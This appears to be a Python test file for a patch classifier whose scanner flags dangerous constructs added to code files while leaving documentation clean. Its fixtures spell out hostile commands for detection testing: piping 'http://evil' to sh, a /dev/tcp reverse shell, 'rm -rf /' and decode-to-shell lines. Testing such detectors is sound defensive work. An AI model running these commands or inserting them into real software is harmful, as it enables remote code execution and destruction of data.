"""Tests for divergulent.classify.rules — the no-cry-wolf content verdict core.

All tests are offline (no I/O, no network).  Coverage centres on the two
promises the module makes:

  * Deterministic rules settle only ``packaging``/``documentation`` at high
    confidence; everything substantive is ``unknown``/low (the phase-4 residue),
    never a guessed bugfix/feature/security.
  * Dangerous constructs are evidence-bearing CANDIDATE flags, never a category.
    The scan runs only over code added lines, so a construct in a manpage stays
    clean while the same construct added to a ``.c``/``.sh`` file fires — and
    even then the category is ``unknown``/substantive, not ``security``.

The phase-1 recurring-tail taxonomy (mode-only → packaging; ``.gitignore``
adding ``.pc`` → packaging; doc-only → documentation) is an explicit acceptance
test here too.
"""
import testtools

from divergulent.classify.claim import extract_claim
from divergulent.classify.content import profile
from divergulent.classify.rules import (
    ContentVerdict, Flag, RULES_VERSION, classify_content,
    scan_dangerous_constructs)


# ---------------------------------------------------------------------------
# Fixture builders
# ---------------------------------------------------------------------------

def _edit(path, removed='old line', added='new line', *, ctx_before='before',
          ctx_after='after'):
    """A one-hunk replacement edit on ``path``."""
    return (
        f'--- a/{path}\n'
        f'+++ b/{path}\n'
        '@@ -1,3 +1,3 @@\n'
        f' {ctx_before}\n'
        f'-{removed}\n'
        f'+{added}\n'
        f' {ctx_after}\n'
    )


def _add(path, *added, ctx='ctx'):
    """A one-hunk pure-addition on ``path``."""
    body = ''.join(f'+{line}\n' for line in added)
    return (
        f'--- a/{path}\n'
        f'+++ b/{path}\n'
        f'@@ -1 +1,{1 + len(added)} @@\n'
        f' {ctx}\n'
        + body
    )


def _verdict(text, name='patch.patch'):
    """Run the full deterministic content verdict over a patch body."""
    claim = extract_claim(name, text)
    prof = profile(text)
    return classify_content(claim, prof, text)


# ---------------------------------------------------------------------------
# The no-cry-wolf invariant: a dangerous construct in PROSE must stay clean.
# ---------------------------------------------------------------------------

class NoCryWolfTestCase(testtools.TestCase):

    def test_manpage_mentioning_system_does_not_flag(self):
        # The motivating false positive: a manpage adding a line that mentions
        # system("/bin/sh") must NOT produce a dangerous-construct flag, because
        # the scan only sees code-file added lines.  Category is documentation.
        diff = _add('man/foo.1', 'Calls system("/bin/sh") to spawn a shell.')
        verdict = _verdict(diff)
        self.assertEqual([], verdict.flags)
        self.assertEqual('documentation', verdict.content_category)
        self.assertEqual('high', verdict.confidence)

    def test_manpage_mentioning_curl_pipe_sh_does_not_flag(self):
        diff = _add('doc/install.txt', 'Run: curl http://x/i.sh | sh')
        # docs/-tree .txt is doc; no code lines, so no flag.
        self.assertEqual([], scan_dangerous_constructs(diff))


# ---------------------------------------------------------------------------
# Dangerous constructs in CODE fire as candidate flags — never a verdict.
# ---------------------------------------------------------------------------

class DangerousConstructInCodeTestCase(testtools.TestCase):

    def test_system_in_c_file_flags_but_category_stays_unknown(self):
        diff = _add('src/foo.c', 'system("rm -rf /");')
        verdict = _verdict(diff)
        self.assertEqual(1, len(verdict.flags))
        flag = verdict.flags[0]
        self.assertEqual('dangerous-construct', flag.kind)
        self.assertEqual('shell-out', flag.detail)
        self.assertEqual('system("rm -rf /");', flag.evidence)
        # No cry wolf: still unknown/substantive, NOT security.
        self.assertEqual('unknown', verdict.content_category)
        self.assertEqual('low', verdict.confidence)

    def test_curl_piped_to_sh_in_shell_script_flags(self):
        diff = _add('install.sh', 'curl http://evil/x.sh | sh')
        flags = scan_dangerous_constructs(diff)
        self.assertEqual(1, len(flags))
        self.assertEqual('fetch-piped-to-shell', flags[0].detail)
        self.assertEqual('curl http://evil/x.sh | sh', flags[0].evidence)

    def test_curl_piped_to_sh_category_still_unknown(self):
        diff = _add('install.sh', 'curl http://evil/x.sh | sh')
        verdict = _verdict(diff)
        self.assertEqual('unknown', verdict.content_category)
        self.assertNotEqual('security', verdict.content_category)
        self.assertTrue(verdict.flags)

    def test_os_system_in_python_flags(self):
        diff = _add('pkg/run.py', 'os.system("wget http://x")')
        flags = scan_dangerous_constructs(diff)
        self.assertEqual(1, len(flags))
        self.assertEqual('shell-out', flags[0].detail)

    def test_subprocess_shell_true_flags(self):
        diff = _add('pkg/run.py', 'subprocess.call(cmd, shell=True)')
        flags = scan_dangerous_constructs(diff)
        self.assertEqual(['shell-out'], [f.detail for f in flags])

    def test_base64_decode_piped_to_sh_flags(self):
        diff = _add('install.sh', 'echo $X | base64 -d | sh')
        flags = scan_dangerous_constructs(diff)
        self.assertEqual(['decode-piped-to-shell'], [f.detail for f in flags])

    def test_dev_tcp_reverse_shell_flags(self):
        diff = _add('exploit.sh', 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')
        flags = scan_dangerous_constructs(diff)
        self.assertIn('reverse-shell', [f.detail for f in flags])

    def test_embedded_private_key_in_code_flags(self):
        diff = _add('src/keys.py', 'KEY = "-----BEGIN RSA PRIVATE KEY-----"')
        flags = scan_dangerous_constructs(diff)
        self.assertEqual(['embedded-private-key'], [f.detail for f in flags])

    def test_openssh_private_key_flags(self):
        diff = _add('src/keys.py', '-----BEGIN OPENSSH PRIVATE KEY-----')
        flags = scan_dangerous_constructs(diff)
        self.assertEqual(['embedded-private-key'], [f.detail for f in flags])

    def test_each_line_flagged_once_per_detail(self):
        # A line that matches several shell-out variants flags shell-out once.
        diff = _add('x.sh', 'system(`id`)')
        flags = [f for f in scan_dangerous_constructs(diff)
                 if f.detail == 'shell-out']
        self.assertEqual(1, len(flags))

    def test_backtick_command_substitution_in_shell_flags(self):
        # A bare backtick command substitution in a shell file is a real danger.
        diff = _add('install.sh', 'HOME=`readlink -f "$0"`')
        flags = scan_dangerous_constructs(diff)
        self.assertEqual(['shell-out'], [f.detail for f in flags])

    def test_js_template_literal_does_not_cry_wolf(self):
        # The phase-2 false positive: a JavaScript template literal uses
        # backticks but is not command substitution, so it must not flag.
        diff = _add('build.js', 'banner: `// ${meta.homepage} v${meta.version}`,')
        self.assertEqual([], scan_dangerous_constructs(diff))

    def test_lisp_quasiquote_does_not_cry_wolf(self):
        # Emacs Lisp uses backticks for quasiquote / docstring symbol refs.
        diff = _add('mew.el', "Use `mew-expand-folder' iff available.")
        self.assertEqual([], scan_dangerous_constructs(diff))

    def test_removed_dangerous_line_does_not_flag(self):
        # A construct being REMOVED is not an added construct.
        diff = (
            '--- a/x.sh\n'
            '+++ b/x.sh\n'
            '@@ -1,2 +1,1 @@\n'
            ' ctx\n'
            '-system("rm -rf /")\n'
        )
        self.assertEqual([], scan_dangerous_constructs(diff))


# ---------------------------------------------------------------------------
# Precision: ordinary code must not cry wolf.
# ---------------------------------------------------------------------------

class PrecisionTestCase(testtools.TestCase):

    def test_word_system_in_comment_does_not_flag(self):
        diff = _add('src/foo.c', '// the operating system handles this')
        self.assertEqual([], scan_dangerous_constructs(diff))

    def test_bare_curl_without_pipe_does_not_flag(self):
        diff = _add('install.sh', 'curl -o out http://example/file')
        self.assertEqual([], scan_dangerous_constructs(diff))

    def test_bare_subprocess_without_shell_true_does_not_flag(self):
        diff = _add('pkg/run.py', 'subprocess.run(["ls", "-l"])')
        self.assertEqual([], scan_dangerous_constructs(diff))

    def test_ordinary_base64_without_shell_does_not_flag(self):
        diff = _add('pkg/run.py', 'data = base64.b64decode(payload)')
        self.assertEqual([], scan_dangerous_constructs(diff))


# ---------------------------------------------------------------------------
# Phase-1 recurring-tail taxonomy — explicit acceptance tests.
# ---------------------------------------------------------------------------

class RecurringTailTestCase(testtools.TestCase):

    def test_mode_only_change_is_packaging(self):
        diff = (
            'diff --git a/script.sh b/script.sh\n'
            'old mode 100644\n'
            'new mode 100755\n'
        )
        verdict = _verdict(diff)
        self.assertEqual('packaging', verdict.content_category)
        self.assertEqual('high', verdict.confidence)
        self.assertIn('empty', verdict.rule_ids)

    def test_gitignore_adding_pc_is_packaging(self):
        diff = (
            '--- a/.gitignore\n'
            '+++ b/.gitignore\n'
            '@@ -1,2 +1,4 @@\n'
            ' *.o\n'
            ' *.lo\n'
            '+.pc\n'
            '+_build\n'
        )
        verdict = _verdict(diff)
        self.assertEqual('packaging', verdict.content_category)
        self.assertEqual('high', verdict.confidence)
        self.assertIn('ignore-file-only', verdict.rule_ids)

    def test_doc_only_patch_is_documentation(self):
        diff = _edit('README.md', removed='a', added='b')
        verdict = _verdict(diff)
        self.assertEqual('documentation', verdict.content_category)
        self.assertEqual('high', verdict.confidence)
        self.assertIn('doc-only', verdict.rule_ids)

    def test_whitespace_reindent_is_packaging(self):
        diff = (
            '--- a/src/foo.c\n'
            '+++ b/src/foo.c\n'
            '@@ -1,2 +1,2 @@\n'
            '-    return x;\n'
            '+\treturn x;\n'
            '-  if (y) {\n'
            '+    if (y) {\n'
        )
        verdict = _verdict(diff)
        self.assertEqual('packaging', verdict.content_category)
        self.assertIn('whitespace-only', verdict.rule_ids)

    def test_comment_only_change_is_documentation(self):
        diff = (
            '--- a/pkg/foo.py\n'
            '+++ b/pkg/foo.py\n'
            '@@ -1 +1 @@\n'
            '-# old explanation\n'
            '+# new explanation\n'
        )
        verdict = _verdict(diff)
        self.assertEqual('documentation', verdict.content_category)
        self.assertIn('comment-only', verdict.rule_ids)

    def test_build_only_change_is_packaging(self):
        diff = _edit('configure.ac', removed='AC_OLD', added='AC_NEW')
        verdict = _verdict(diff)
        self.assertEqual('packaging', verdict.content_category)
        self.assertIn('build-only', verdict.rule_ids)

    def test_debian_only_change_is_packaging(self):
        diff = _edit('debian/rules', removed='c', added='d')
        verdict = _verdict(diff)
        self.assertEqual('packaging', verdict.content_category)
        self.assertIn('build-only', verdict.rule_ids)

    def test_test_only_change_is_test(self):
        diff = _edit('tests/test_foo.py', removed='assert x == 1', added='assert x == 2')
        verdict = _verdict(diff)
        self.assertEqual('test', verdict.content_category)
        self.assertIn('test-only', verdict.rule_ids)

    def test_multiple_test_files_still_test(self):
        diff = (_edit('t/one.t', removed='ok 1', added='ok 2')
                + _edit('src/foo_test.go', removed='want := 1', added='want := 2'))
        verdict = _verdict(diff)
        self.assertEqual('test', verdict.content_category)
        self.assertIn('test-only', verdict.rule_ids)

    def test_test_plus_code_is_not_test_only(self):
        # A change touching tests AND production code is substantive, not test:
        # the code change can alter the shipped artifact, so it must be triaged.
        diff = (_edit('tests/test_foo.py', removed='assert x == 1', added='assert x == 2')
                + _edit('src/foo.c', removed='int x = 1;', added='int x = 2;'))
        verdict = _verdict(diff)
        self.assertEqual('unknown', verdict.content_category)
        self.assertNotIn('test-only', verdict.rule_ids)


# ---------------------------------------------------------------------------
# Substantive residue — the phase-4 hand-off.
# ---------------------------------------------------------------------------

class SubstantiveResidueTestCase(testtools.TestCase):

    def test_substantive_code_change_is_unknown_low_no_flags(self):
        diff = _edit('src/foo.c', removed='int x = 1;', added='int x = 2;')
        verdict = _verdict(diff)
        self.assertEqual('unknown', verdict.content_category)
        self.assertEqual('low', verdict.confidence)
        self.assertEqual([], verdict.flags)
        self.assertIn('substantive', verdict.rule_ids)
        self.assertTrue(verdict.signals)

    def test_mixed_code_and_doc_is_substantive(self):
        # Not all-doc and not all-build: falls through to substantive.
        diff = _edit('src/foo.c') + _edit('README.md', removed='a', added='b')
        verdict = _verdict(diff)
        self.assertEqual('unknown', verdict.content_category)
        self.assertIn('substantive', verdict.rule_ids)

    def test_flag_does_not_change_substantive_category(self):
        diff = _add('src/foo.c', 'system("rm -rf /");', 'int real_change = 1;')
        verdict = _verdict(diff)
        self.assertEqual('unknown', verdict.content_category)
        self.assertTrue(verdict.flags)


# ---------------------------------------------------------------------------
# Structure / provenance.
# ---------------------------------------------------------------------------

class StructureTestCase(testtools.TestCase):

    def test_returns_content_verdict_with_rule_version(self):
        verdict = _verdict(_edit('src/foo.c'))
        self.assertIsInstance(verdict, ContentVerdict)
        self.assertEqual(RULES_VERSION, verdict.rule_version)
        self.assertEqual(1, verdict.rule_version)

    def test_verdict_is_frozen(self):
        verdict = _verdict(_edit('src/foo.c'))
        with self.assertRaises(Exception):
            verdict.content_category = 'security'  # type: ignore[misc]

    def test_flag_is_frozen(self):
        flag = Flag(kind='dangerous-construct', detail='shell-out', evidence='x')
        with self.assertRaises(Exception):
            flag.detail = 'other'  # type: ignore[misc]

    def test_content_verdict_ignores_claim(self):
        # The content verdict must NOT depend on the claim.  A security-claiming
        # header over a doc-only diff still yields a documentation verdict.
        diff = _edit('README.md', removed='a', added='b')
        text = 'Description: fix CVE-2024-1234 overflow\nForwarded: no\n\n' + diff
        claim = extract_claim('security/fix.patch', text)
        self.assertEqual('security', claim.claimed_category)
        verdict = classify_content(claim, profile(text), text)
        self.assertEqual('documentation', verdict.content_category)

    def test_category_is_in_allowed_set(self):
        for diff in (_edit('src/foo.c'), _edit('README.md'),
                     _edit('debian/rules')):
            verdict = _verdict(diff)
            self.assertIn(
                verdict.content_category,
                ('packaging', 'documentation', 'unknown'))
            self.assertNotEqual('security', verdict.content_category)
